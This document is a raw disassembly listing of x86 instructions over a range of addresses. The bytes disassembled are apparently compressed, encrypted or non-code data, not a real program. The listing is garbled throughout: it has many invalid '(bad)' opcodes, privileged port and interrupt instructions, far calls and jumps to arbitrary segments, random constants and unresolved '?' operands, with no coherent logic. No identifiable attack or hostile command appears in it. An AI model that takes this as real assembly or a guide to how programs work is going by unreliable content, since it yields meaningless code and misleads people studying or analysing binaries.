  42f2bd:	sub    edi,DWORD PTR [ebx+ebx*8-0x60]
  42f2c1:	sbb    al,dl
  42f2c3:	jno    0x42f260
  42f2c5:	sbb    DWORD PTR [edx+0x78],0xb750a999
  42f2cc:	pop    ebp
  42f2cd:	or     DWORD PTR [ebx-0x6d],edx
  42f2d0:	dec    ebx
  42f2d1:	frstor [ecx-0x1b]
  42f2d4:	mov    ch,0x20
  42f2d6:	fisubr WORD PTR [ebx+0x5f70cb2c]
  42f2dc:	dec    dl
  42f2de:	push   0x13
  42f2e0:	call   FWORD PTR [edx+esi*8]
  42f2e3:	fst    QWORD PTR [eax+0x42]
  42f2e6:	daa    
  42f2e7:	xor    eax,0xbcd5feb9
  42f2ec:	and    eax,0xc94d80a5
  42f2f1:	mov    eax,0xb16eaeb0
  42f2f6:	pop    ecx
  42f2f7:	mov    eax,ds:0x774e0fd0
  42f2fc:	aaa    
  42f2fd:	jecxz  0x42f348
  42f2ff:	mov    ah,0xd5
  42f301:	sbb    al,0xe7
  42f303:	push   ds
  42f304:	dec    ebp
  42f305:	retf   
  42f306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f307:	int3   
  42f308:	ds add al,0x49
  42f30b:	outs   dx,BYTE PTR ds:[esi]
  42f30c:	in     eax,dx
  42f30d:	xchg   ecx,eax
  42f30e:	in     al,0x10
  42f310:	add    BYTE PTR gs:[eax],al
	...
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	push   ebx
  42f381:	push   ds
  42f382:	sub    ebp,DWORD PTR [ebp-0x75]
  42f385:	cli    
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x57000001
  42f38d:	mov    ds:0x9cfdfddf,al
  42f392:	or     al,0x85
  42f394:	jl     0x42f3b7
  42f396:	inc    edx
  42f397:	adc    BYTE PTR [edx-0x26],0x9c
  42f39b:	dec    ecx
  42f39c:	pop    ebp
  42f39d:	mov    al,ds:0x1fd728e4
  42f3a2:	jnp    0x42f3cf
  42f3a4:	mov    eax,ds:0xd2ff8617
  42f3a9:	mov    gs,WORD PTR [ebp+0x53]
  42f3ac:	jge    0x42f3c8
  42f3ae:	sub    al,0xdf
  42f3b0:	daa    
  42f3b1:	push   0xcaabb52a
  42f3b6:	mov    eax,0xa6e137e9
  42f3bb:	jae    0x42f40c
  42f3bd:	arpl   bp,sp
  42f3bf:	(bad)  
  42f3c0:	out    dx,al
  42f3c1:	sahf   
  42f3c2:	jle    0x42f3e8
  42f3c4:	jp     0x42f3d1
  42f3c6:	stos   DWORD PTR es:[edi],eax
  42f3c7:	pop    eax
  42f3c8:	mov    dh,BYTE PTR [ecx+0x57]
  42f3cb:	mov    al,BYTE PTR [esi-0x1d]
  42f3ce:	cld    
  42f3cf:	shr    BYTE PTR [ecx+0x46],cl
  42f3d2:	loope  0x42f3f6
  42f3d4:	xor    eax,DWORD PTR [bp+si+0x6b]
  42f3d8:	bound  ebp,QWORD PTR [edi-0x2abbbfa1]
  42f3de:	mov    BYTE PTR [esi],bl
  42f3e0:	and    BYTE PTR [edi+0x5904c2c6],dl
  42f3e6:	mov    ah,0x8f
  42f3e8:	mov    ecx,0x37abb0cc
  42f3ed:	addr16 (bad) 
  42f3ef:	es das 
  42f3f1:	sar    BYTE PTR fs:[ebp-0x44],cl
  42f3f5:	cdq    
  42f3f6:	jno    0x42f3d6
  42f3f8:	xor    DWORD PTR [eax-0x4639e03a],eax
  42f3fe:	les    ebp,FWORD PTR [eax-0x5b]
  42f401:	lds    edi,FWORD PTR [edi]
  42f403:	pop    es
  42f404:	and    ch,BYTE PTR [ebp+0x4c0fc0c1]
  42f40a:	mov    dl,0xf0
  42f40c:	nop
  42f40d:	add    DWORD PTR [edi],esp
  42f40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f410:	mov    cl,0xba
  42f412:	mov    WORD PTR [edi],?
  42f414:	mov    ss,WORD PTR [esi+0x39]
  42f417:	(bad)  
  42f418:	mov    ecx,es
  42f41a:	fwait
  42f41b:	adc    eax,0xb1035550
  42f420:	(bad)  
  42f421:	js     0x42f404
  42f423:	push   cs
  42f424:	daa    
  42f425:	sbb    eax,0x6ce61847
  42f42a:	test   al,0x4a
  42f42c:	add    dh,BYTE PTR [ebx+0x4a2d97a4]
  42f432:	in     eax,dx
  42f433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f434:	(bad)  
  42f436:	mov    al,ds:0x96c52d59
  42f43b:	mov    ch,0x37
  42f43d:	pop    ebp
  42f43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f43f:	xchg   ebx,eax
  42f440:	mov    DWORD PTR [ebx+0x6b],eax
  42f443:	push   edi
  42f445:	mov    esp,0xae57eb16
  42f44a:	pop    edx
  42f44b:	mov    cl,0x49
  42f44d:	adc    eax,0x7d76edf7
  42f452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f453:	mov    dh,0xb0
  42f455:	dec    esi
  42f456:	or     BYTE PTR [edx],bh
  42f458:	cmp    esi,esp
  42f45a:	pop    es
  42f45b:	out    dx,eax
  42f45c:	pop    ebx
  42f45d:	out    dx,eax
  42f45e:	imul   esp,DWORD PTR [ecx+0x4b],0x2f85ca7d
  42f465:	test   BYTE PTR [edi-0x304b36bf],ah
  42f46b:	mul    DWORD PTR [ebx-0x46c03832]
  42f471:	ins    BYTE PTR es:[edi],dx
  42f472:	es fldz 
  42f475:	sub    eax,0xfec35401
  42f47a:	call   0xf22c3854
  42f47f:	mov    edx,DWORD PTR [ebp+0x3a]
  42f482:	xchg   ebx,eax
  42f483:	int    0x35
  42f485:	clc    
  42f486:	lds    edx,FWORD PTR [ecx+0x2700858a]
  42f48c:	push   edi
  42f48d:	adc    DWORD PTR [edx+0x6f34],esi
	...
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	adc    DWORD PTR [ecx],ebx
  42f502:	and    al,0x63
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x97000001
  42f50d:	cmp    ecx,ebp
  42f50f:	push   ebp
  42f510:	xlat   BYTE PTR ds:[ebx]
  42f511:	div    DWORD PTR [ecx+0x7e]
  42f514:	loop   0x42f4e1
  42f516:	mov    ds:0xd37b0b1a,eax
  42f51b:	fld    TBYTE PTR [esi]
  42f51d:	icebp  
  42f51e:	and    al,0xf3
  42f520:	cld    
  42f521:	or     edi,DWORD PTR [ebx-0xe]
  42f524:	push   ecx
  42f525:	pop    edi
  42f526:	cmp    ebp,DWORD PTR [edx+0x2439b88d]
  42f52c:	mov    ecx,?
  42f52e:	out    0xd2,eax
  42f530:	test   BYTE PTR ss:[ebp-0x27],ah
  42f534:	call   0xc288bbc7
  42f539:	stos   DWORD PTR es:[edi],eax
  42f53a:	jno    0x42f51b
  42f53c:	xchg   edi,eax
  42f53d:	or     edi,DWORD PTR [edx]
  42f53f:	cmp    ebp,DWORD PTR [ebx+0x48]
  42f542:	sbb    al,bl
  42f544:	dec    eax
  42f545:	dec    ebp
  42f546:	cmp    cl,bl
  42f548:	(bad)  
  42f549:	imul   edi,edi,0x1b
  42f54c:	retf   0xe11c
  42f54f:	sbb    al,BYTE PTR [ebp-0x32]
  42f552:	das    
  42f553:	and    eax,0xccb0f4b
  42f558:	xchg   edx,eax
  42f559:	popa   
  42f55a:	jle    0x42f554
  42f55c:	and    BYTE PTR [eax-0x378e31c2],al
  42f562:	push   ebp
  42f563:	lahf   
  42f564:	add    eax,0x3fa0779f
  42f569:	dec    edx
  42f56a:	lock mov ch,0x9e
  42f56d:	mov    WORD PTR [ecx-0x3136336f],cs
  42f573:	dec    esp
  42f574:	and    dh,dh
  42f576:	ret    
  42f577:	mov    ebp,0x247ae6c9
  42f57c:	mov    gs:0x99eea1da,al
  42f582:	or     DWORD PTR [edx+0x3616ccdb],edx
  42f588:	jecxz  0x42f535
  42f58a:	iret   
  42f58b:	scas   eax,DWORD PTR es:[edi]
  42f58c:	xchg   ecx,eax
  42f58d:	mov    edi,edx
  42f58f:	adc    BYTE PTR [ebp+0x12df515c],dh
  42f595:	mov    ah,0xfc
  42f597:	mov    eax,ds:0xdad1563c
  42f59c:	mov    eax,esp
  42f59e:	or     DWORD PTR ds:0x208f3dc,ebx
  42f5a4:	xchg   esp,eax
  42f5a5:	loope  0x42f556
  42f5a7:	add    ebp,DWORD PTR [esi+0x55]
  42f5aa:	int    0xcf
  42f5ac:	jecxz  0x42f59a
  42f5ae:	lahf   
  42f5af:	in     eax,0x5c
  42f5b1:	mov    dl,0xd0
  42f5b3:	test   BYTE PTR [esi],bh
  42f5b5:	jmp    0x8929d3f1
  42f5ba:	jne    0x42f577
  42f5bc:	in     al,dx
  42f5bd:	mov    bl,0x19
  42f5bf:	in     al,dx
  42f5c0:	jo     0x42f5d7
  42f5c2:	sbb    DWORD PTR [edi-0x7455b347],edx
  42f5c8:	cli    
  42f5c9:	jg     0x42f5e7
  42f5cb:	mov    edi,0x9f051389
  42f5d0:	aam    0x9d
  42f5d2:	pop    edx
  42f5d3:	int3   
  42f5d4:	scas   al,BYTE PTR es:[edi]
  42f5d5:	dec    esp
  42f5d6:	stos   BYTE PTR es:[edi],al
  42f5d7:	adc    eax,0xe08c6083
  42f5dc:	cmp    DWORD PTR [eax-0x3f36820a],0xa50fac68
  42f5e6:	adc    DWORD PTR [edi+0x9],eax
  42f5e9:	mov    WORD PTR [edx-0x28],?
  42f5ec:	and    eax,0x3f833c8c
  42f5f1:	sub    bh,ch
  42f5f3:	pop    eax
  42f5f4:	ds cs push ss
  42f5f7:	jp     0x42f5de
  42f5f9:	rcl    BYTE PTR [ebx+0x4d17be62],cl
  42f5ff:	call   0x8600:0x97e42664
  42f606:	mov    al,ds:0x6795c7e
  42f60b:	inc    esi
  42f60c:	mov    esi,DWORD PTR [edx]
  42f60e:	das    
  42f60f:	xchg   DWORD PTR ds:0x0,ecx
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	in     al,0xe2
  42f682:	pop    edi
  42f683:	ret    0xfc95
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x2c000001
  42f68d:	arpl   WORD PTR [ecx-0x61f96ccd],cx
  42f693:	adc    al,0x32
  42f695:	jp     0x42f66a
  42f697:	imul   esp,DWORD PTR [eax+0x7b],0x34
  42f69b:	stos   DWORD PTR es:[edi],eax
  42f69c:	push   ecx
  42f69d:	sbb    BYTE PTR [esi],bh
  42f69f:	sub    al,0x22
  42f6a1:	add    al,0xa
  42f6a3:	or     DWORD PTR [esi-0x4ef1e080],esp
  42f6a9:	push   cs
  42f6aa:	loope  0x42f70c
  42f6ac:	jns    0x42f6d9
  42f6ae:	xchg   ebx,eax
  42f6af:	dec    ebx
  42f6b0:	das    
  42f6b1:	(bad)  
  42f6b2:	mov    esp,0x233e9937
  42f6b7:	pop    ebx
  42f6b8:	xchg   esp,eax
  42f6b9:	cmp    edi,DWORD PTR [edx]
  42f6bb:	outs   dx,BYTE PTR ds:[esi]
  42f6bc:	in     eax,dx
  42f6bd:	imul   ecx,edx,0x41c76ee1
  42f6c3:	fsubp  st(6),st
  42f6c5:	jnp    0x42f67f
  42f6c7:	add    esi,DWORD PTR [ebx]
  42f6c9:	stos   BYTE PTR es:[edi],al
  42f6ca:	shr    BYTE PTR [esi],cl
  42f6cc:	or     DWORD PTR [edx-0x7281cdac],edi
  42f6d2:	retf   0x24bb
  42f6d5:	mov    eax,ds:0x449cac46
  42f6da:	add    ch,BYTE PTR [ebp-0x49]
  42f6dd:	dec    esi
  42f6de:	ds push esp
  42f6e0:	or     BYTE PTR [ebp+ecx*1+0x2c],0x4d
  42f6e5:	jne    0x42f6d8
  42f6e7:	ins    BYTE PTR es:[edi],dx
  42f6e8:	add    ah,BYTE PTR [eax+0x6b]
  42f6eb:	mov    esi,0x2a01020b
  42f6f0:	into   
  42f6f1:	cmp    edx,edx
  42f6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6f4:	outs   dx,BYTE PTR ds:[esi]
  42f6f5:	fsubr  QWORD PTR [edi-0x48]
  42f6f8:	ror    esi,1
  42f6fa:	add    DWORD PTR [edx+esi*2+0x133d170e],edi
  42f701:	mov    ah,0x46
  42f703:	inc    ecx
  42f704:	adc    BYTE PTR [edx-0x3b],dh
  42f707:	sbb    BYTE PTR [eax+0x155697d7],cl
  42f70d:	jg     0x42f78e
  42f70f:	retf   0x90a3
  42f712:	pushf  
  42f713:	adc    bl,BYTE PTR [edx+0x4d]
  42f716:	jge    0x42f6b6
  42f718:	std    
  42f719:	in     eax,0x48
  42f71b:	push   ebx
  42f71c:	add    al,ch
  42f71e:	pusha  
  42f71f:	cdq    
  42f720:	push   ds
  42f721:	jecxz  0x42f785
  42f723:	daa    
  42f724:	cdq    
  42f725:	jmp    0xf9e2:0x23f2653
  42f72c:	pop    ss
  42f72d:	push   0x8e677171
  42f732:	xor    eax,0x4dfee71a
  42f737:	lods   al,BYTE PTR ds:[esi]
  42f738:	adc    eax,0xb58654cf
  42f73d:	loope  0x42f6e0
  42f73f:	stos   BYTE PTR es:[edi],al
  42f740:	inc    esi
  42f741:	fimul  DWORD PTR [ebx+0x7f240233]
  42f747:	imul   esi,DWORD PTR [ebx-0x3a],0x25
  42f74b:	mov    al,ds:0xb4a420c2
  42f750:	adc    eax,DWORD PTR [ebx+0x44b5762a]
  42f756:	loop   0x42f7cb
  42f758:	add    bh,ch
  42f75a:	xchg   esp,eax
  42f75b:	cdq    
  42f75c:	in     eax,0x95
  42f75e:	pop    ecx
  42f75f:	jnp    0x42f6f8
  42f761:	cmp    al,0xbf
  42f763:	mov    al,ds:0x4c1ffccc
  42f768:	jno    0x42f7ab
  42f76a:	jl     0x42f7bd
  42f76c:	leave  
  42f76d:	mov    cl,0x73
  42f76f:	pop    esp
  42f770:	ds pop esp
  42f772:	sbb    eax,0x8faf1491
  42f777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f778:	mov    ds:0xfe4189fe,al
  42f77d:	mov    eax,ds:0x25b36e3a
  42f782:	pop    ss
  42f783:	frstor [ebp+0x6a6cbe21]
  42f789:	scas   eax,DWORD PTR es:[edi]
  42f78a:	adc    ebp,DWORD PTR [edi+0x77]
  42f78d:	mov    bl,0xdf
  42f78f:	jno    0x42f7af
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xdfbb4ee8
  42f804:	call   0x1:0x50001fd
  42f80b:	add    bl,dh
  42f80d:	(bad)  
  42f80e:	fmulp  st(1),st
  42f810:	pop    ecx
  42f811:	jecxz  0x42f7f0
  42f813:	push   es
  42f814:	cmp    al,BYTE PTR [edi+0x52]
  42f817:	xlat   BYTE PTR ds:[ebx]
  42f818:	and    BYTE PTR [ebx+esi*8+0x6d16595d],cl
  42f81f:	repz push ebx
  42f821:	cli    
  42f822:	fwait
  42f823:	xchg   BYTE PTR [eax+eiz*8-0x53],dh
  42f827:	lods   al,BYTE PTR ds:[esi]
  42f828:	inc    esp
  42f829:	cmc    
  42f82a:	in     eax,0x9b
  42f82c:	pop    eax
  42f82d:	scas   eax,DWORD PTR es:[edi]
  42f82e:	cmc    
  42f82f:	add    edi,ecx
  42f831:	inc    ebp
  42f832:	dec    ebx
  42f833:	out    dx,al
  42f834:	add    BYTE PTR [ebx],al
  42f836:	push   cs
  42f837:	pop    ebp
  42f838:	mov    dh,0x77
  42f83a:	dec    ebp
  42f83b:	in     eax,dx
  42f83c:	sub    BYTE PTR [eax],cl
  42f83e:	fmul   st(0),st
  42f840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f841:	call   0xf0851cae
  42f846:	std    
  42f847:	pushf  
  42f848:	(bad)  
  42f849:	shl    BYTE PTR [edi+0x16],cl
  42f84c:	ror    edx,0x1d
  42f84f:	pop    ss
  42f850:	(bad)  
  42f851:	out    0xcd,al
  42f853:	repz je 0x42f830
  42f856:	ins    BYTE PTR es:[edi],dx
  42f857:	lahf   
  42f858:	aaa    
  42f859:	lock repz retf 0x8865
  42f85e:	pop    es
  42f85f:	adc    eax,0xb1ed1c1f
  42f864:	icebp  
  42f865:	cwde   
  42f866:	inc    ecx
  42f867:	retf   
  42f868:	dec    ebp
  42f869:	in     al,0x39
  42f86b:	das    
  42f86c:	sub    al,0x12
  42f86e:	or     al,0x87
  42f870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f871:	ss sbb al,0x37
  42f874:	shr    BYTE PTR [edx-0x37],0x8
  42f878:	lods   eax,DWORD PTR fs:[esi]
  42f87a:	inc    eax
  42f87b:	mov    al,0x2c
  42f87d:	ins    DWORD PTR es:[edi],dx
  42f87e:	gs sti 
  42f880:	mov    cl,0x74
  42f882:	sbb    ah,BYTE PTR [ecx+0xf]
  42f885:	popa   
  42f886:	add    BYTE PTR [ebx+0x78b321ba],dh
  42f88c:	(bad)  
  42f88d:	push   edi
  42f88e:	popf   
  42f88f:	push   es
  42f890:	jl     0x42f81f
  42f892:	out    dx,al
  42f893:	jg     0x42f8b3
  42f895:	and    BYTE PTR [eax+0x73e24dec],ch
  42f89b:	in     eax,0xa9
  42f89d:	sbb    DWORD PTR [esi+0x123d2611],0x289481b3
  42f8a7:	push   esp
  42f8a8:	js     0x42f8ff
  42f8aa:	adc    eax,0xe71f2755
  42f8af:	jmp    0x42f83c
  42f8b1:	pop    edx
  42f8b2:	out    0x7b,eax
  42f8b4:	popf   
  42f8b5:	xchg   DWORD PTR [esi+0xf],esp
  42f8b8:	(bad)  
  42f8b9:	(bad)  
  42f8bb:	in     al,dx
  42f8bc:	mov    esp,0x6cc11f0d
  42f8c1:	ret    
  42f8c2:	mov    ebp,0xaf61582e
  42f8c7:	les    esp,FWORD PTR [esi+0x6294b6ba]
  42f8cd:	nop
  42f8ce:	push   ebx
  42f8cf:	repnz fmul QWORD PTR [ecx]
  42f8d2:	mov    edi,0x45a034a3
  42f8d7:	fcom   QWORD PTR [ecx+0x3fa9f41b]
  42f8dd:	retf   
  42f8de:	fwait
  42f8df:	call   0xa6c45fb3
  42f8e4:	mov    eax,ds:0xd0fe2541
  42f8e9:	push   es
  42f8ea:	cmp    al,0xab
  42f8ec:	or     al,0x20
  42f8ee:	pop    eax
  42f8ef:	ja     0x42f8ee
  42f8f1:	push   cs
  42f8f2:	mov    ah,0xf5
  42f8f4:	sbb    eax,0x215ec297
  42f8f9:	mov    bh,0xa
  42f8fb:	fbld   TBYTE PTR [ebx-0x2a279655]
  42f901:	int    0x22
  42f903:	jle    0x42f91b
  42f905:	mov    gs,edx
  42f907:	mov    edx,0x6a14224e
  42f90c:	mov    bh,0x70
  42f90e:	jbe    0x42f890
  42f910:	test   DWORD PTR [eax],eax
	...
  42f972:	add    BYTE PTR [eax],al
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9c2
  42f981:	dec    ebp
  42f982:	jle    0x42f9b9
  42f984:	lahf   
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0xfe000001,al
  42f98d:	mov    ebp,0xa3be56f4
  42f992:	and    dl,BYTE PTR [ebx+ebx*8-0x64bb4565]
  42f999:	jp     0x42f9fd
  42f99b:	dec    esi
  42f99c:	repnz pop ebx
  42f99e:	icebp  
  42f99f:	cmp    edx,DWORD PTR [eax-0x6]
  42f9a2:	fldcw  WORD PTR [edx-0x32]
  42f9a5:	fisttp DWORD PTR [edi]
  42f9a7:	out    0xd6,eax
  42f9a9:	dec    ebp
  42f9aa:	test   DWORD PTR [ebp+0x322b84],ebx
  42f9b0:	dec    edi
  42f9b1:	xor    al,0x59
  42f9b3:	imul   ecx,DWORD PTR [ebx],0xbef54bd7
  42f9b9:	xor    esi,DWORD PTR [edi+0xab0d3e4]
  42f9bf:	jmp    0xf633e3b
  42f9c4:	fisttp QWORD PTR [eax+0x1c68b74]
  42f9ca:	jnp    0x42f96f
  42f9cc:	pop    edi
  42f9cd:	and    al,0x6e
  42f9cf:	pop    ecx
  42f9d0:	dec    esp
  42f9d1:	std    
  42f9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d3:	push   esi
  42f9d4:	fiadd  WORD PTR [ecx-0x33]
  42f9d7:	xor    eax,0x7001079b
  42f9dc:	sbb    cl,BYTE PTR [esi+0x41]
  42f9df:	outs   dx,DWORD PTR ds:[esi]
  42f9e0:	mov    eax,0xc30d9e34
  42f9e5:	test   al,0x67
  42f9e7:	inc    ebp
  42f9e8:	push   cs
  42f9e9:	and    DWORD PTR [edx],esp
  42f9eb:	in     al,dx
  42f9ec:	and    edx,DWORD PTR [esi]
  42f9ee:	and    al,0x41
  42f9f0:	in     al,dx
  42f9f1:	xlat   BYTE PTR ds:[ebx]
  42f9f2:	sbb    DWORD PTR [edx+0x63],ebp
  42f9f5:	push   es
  42f9f6:	mov    al,al
  42f9f8:	mov    ah,0x67
  42f9fa:	retf   
  42f9fb:	daa    
  42f9fc:	iret   
  42f9fd:	xchg   DWORD PTR [eax],edi
  42f9ff:	jge    0x42fa06
  42fa01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa02:	lods   al,BYTE PTR ds:[esi]
  42fa03:	xchg   ebx,eax
  42fa04:	pop    ecx
  42fa05:	pop    esi
  42fa06:	in     al,dx
  42fa07:	inc    edi
  42fa08:	add    ebp,ecx
  42fa0a:	outs   dx,BYTE PTR ds:[esi]
  42fa0b:	lods   al,BYTE PTR ds:[esi]
  42fa0c:	ret    
  42fa0d:	gs shr bh,cl
  42fa10:	and    esp,DWORD PTR [esi+ecx*2+0x5c]
  42fa14:	scas   eax,DWORD PTR es:[edi]
  42fa15:	test   DWORD PTR [esi-0x1f],ecx
  42fa18:	jbe    0x42fa71
  42fa1a:	into   
  42fa1b:	enter  0x1c1a,0xeb
  42fa1f:	int3   
  42fa20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa21:	test   al,0xe0
  42fa23:	mov    ds:0x9da6bd98,al
  42fa28:	mov    ebx,eax
  42fa2a:	es inc edi
  42fa2c:	adc    al,0xe0
  42fa2e:	sub    BYTE PTR [edx+0x4698407d],ch
  42fa34:	aaa    
  42fa35:	jmp    0x49b6:0x2ab60ee5
  42fa3c:	jecxz  0x42fa0f
  42fa3e:	mov    bl,0x6a
  42fa40:	sbb    BYTE PTR [ecx],ch
  42fa42:	or     DWORD PTR [ecx],eax
  42fa44:	mov    ebp,0x710caebd
  42fa49:	bound  esi,QWORD PTR [ebp+edx*8+0x1a]
  42fa4d:	call   DWORD PTR [edx]
  42fa4f:	out    0x7d,eax
  42fa51:	adc    eax,0xe767fc47
  42fa56:	jg     0x42faa9
  42fa58:	adc    ah,BYTE PTR [ebx+0xf]
  42fa5b:	fstp   TBYTE PTR [ecx+0x45]
  42fa5e:	fcomp  DWORD PTR [ecx+0x35abee86]
  42fa64:	les    eax,FWORD PTR [ebp-0x16f71ff3]
  42fa6a:	js     0x42fa0b
  42fa6c:	ror    BYTE PTR [ebp-0x1a],cl
  42fa6f:	adc    DWORD PTR [edi-0x4e],0x6954060a
  42fa76:	cdq    
  42fa77:	fisttp DWORD PTR [ebp-0x46551abd]
  42fa7d:	mov    DWORD PTR [ecx],ebp
  42fa7f:	jno    0x42fa85
  42fa81:	sbb    eax,DWORD PTR [ebx]
  42fa83:	xchg   esi,eax
  42fa84:	addr16 es pop esi
  42fa87:	rcr    DWORD PTR [ebx],0xf4
  42fa8a:	rcl    ebp,0xa1
  42fa8d:	push   cs
  42fa8e:	jnp    0x42fa89
  42fa90:	inc    eax
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	adc    eax,DWORD PTR [esi+0x70]
  42fb03:	pop    edx
  42fb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0xe2000001,al
  42fb0d:	dec    edi
  42fb0e:	test   DWORD PTR [ebx-0x57b00f95],eax
  42fb14:	shr    BYTE PTR [ebx],1
  42fb16:	lea    esi,[eax]
  42fb18:	mov    eax,ds:0x6f15dab5
  42fb1d:	(bad)  
  42fb1e:	ficomp DWORD PTR [edx-0x2b]
  42fb21:	test   al,0x11
  42fb23:	sub    dl,BYTE PTR [ebp-0x78]
  42fb26:	pop    ebx
  42fb27:	(bad)  
  42fb28:	mov    edi,0xe77bc4af
  42fb2d:	xor    al,0x2e
  42fb2f:	pop    es
  42fb30:	loop   0x42fae0
  42fb32:	xchg   DWORD PTR [esi-0x11],ecx
  42fb35:	mov    ds:0x805a159a,eax
  42fb3a:	pop    esp
  42fb3b:	pop    edx
  42fb3c:	add    eax,0x1dd8515
  42fb41:	dec    ebp
  42fb42:	mov    ds:0x69ef9bdd,al
  42fb47:	xchg   ebp,eax
  42fb48:	std    
  42fb49:	mov    ds:0x94d433eb,eax
  42fb4e:	dec    ebx
  42fb4f:	mov    eax,0x947ae373
  42fb54:	cmp    al,BYTE PTR [ebx]
  42fb56:	fidivr WORD PTR [edi]
  42fb58:	rol    ebp,1
  42fb5a:	push   ecx
  42fb5b:	mov    eax,ds:0xf23bfc80
  42fb60:	cli    
  42fb61:	pop    esp
  42fb62:	fwait
  42fb63:	lds    edi,FWORD PTR [ecx-0x1b9906f]
  42fb69:	mov    ds:0x325ca14,al
  42fb6e:	pop    ecx
  42fb6f:	or     BYTE PTR [edi-0x4577c7d],0xde
  42fb76:	cmp    DWORD PTR [ecx],edx
  42fb78:	or     eax,0xecbbe87b
  42fb7d:	out    dx,eax
  42fb7e:	jle    0x42fb35
  42fb80:	jecxz  0x42fbae
  42fb82:	pop    ebp
  42fb83:	cwde   
  42fb84:	and    bl,dl
  42fb86:	mov    al,0x9e
  42fb88:	xchg   ecx,eax
  42fb89:	sbb    DWORD PTR [edi+0x59],eax
  42fb8c:	jmp    0xed43:0x720d8a3d
  42fb93:	(bad)  
  42fb95:	xchg   ebp,eax
  42fb96:	ror    DWORD PTR [esi+0x396d0ba9],1
  42fb9c:	aas    
  42fb9d:	js     0x42fb32
  42fb9f:	les    eax,FWORD PTR [eax+edi*8+0x6331ee98]
  42fba6:	or     al,0x75
  42fba8:	pop    ebp
  42fba9:	adc    bl,BYTE PTR [edi*1-0x41bf880e]
  42fbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbb1:	xchg   ecx,eax
  42fbb2:	jno    0x42fbc3
  42fbb4:	cmp    ah,ch
  42fbb6:	loop   0x42fbbd
  42fbb8:	ficom  WORD PTR [ecx+0x43]
  42fbbb:	(bad)  
  42fbbc:	or     al,0xab
  42fbbe:	and    ecx,DWORD PTR [ecx+0x1c96202]
  42fbc4:	mov    dl,0xc1
  42fbc6:	es std 
  42fbc8:	(bad)  
  42fbc9:	fmul   QWORD PTR [eax+0x4880d194]
  42fbcf:	je     0x42fbcd
  42fbd1:	aas    
  42fbd2:	rcl    DWORD PTR [edi-0x1259955a],1
  42fbd8:	aaa    
  42fbd9:	sub    eax,0x22a9594f
  42fbde:	adc    eax,0x2e92eb46
  42fbe3:	mov    bl,0xea
  42fbe5:	xchg   edx,eax
  42fbe6:	aas    
  42fbe7:	pop    esp
  42fbe8:	push   ebx
  42fbe9:	cdq    
  42fbea:	add    dl,BYTE PTR [ecx+ecx*4]
  42fbed:	ins    DWORD PTR es:[edi],dx
  42fbee:	stos   BYTE PTR es:[edi],al
  42fbef:	call   0x89fe:0x650d4bd6
  42fbf6:	adc    cl,0xcf
  42fbf9:	adc    ch,dh
  42fbfb:	leave  
  42fbfc:	cmc    
  42fbfd:	fwait
  42fbfe:	jle    0x42fc46
  42fc00:	popf   
  42fc01:	test   esp,edi
  42fc03:	sbb    BYTE PTR [edx-0x10a70282],al
  42fc09:	das    
  42fc0a:	jae    0x42fbe3
  42fc0c:	inc    edi
  42fc0d:	push   ds
  42fc0e:	hlt    
  42fc0f:	push   cs
  42fc10:	inc    esp
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0xe85:0x2036325e
  42fc82:	sub    DWORD PTR [ebx],edx
  42fc84:	test   eax,0x5000200
  42fc89:	add    DWORD PTR [eax],eax
  42fc8b:	add    BYTE PTR [edi+0x63848f94],cl
  42fc91:	lds    ebp,FWORD PTR [edi]
  42fc93:	daa    
  42fc94:	xchg   edi,eax
  42fc95:	retf   0x1d0b
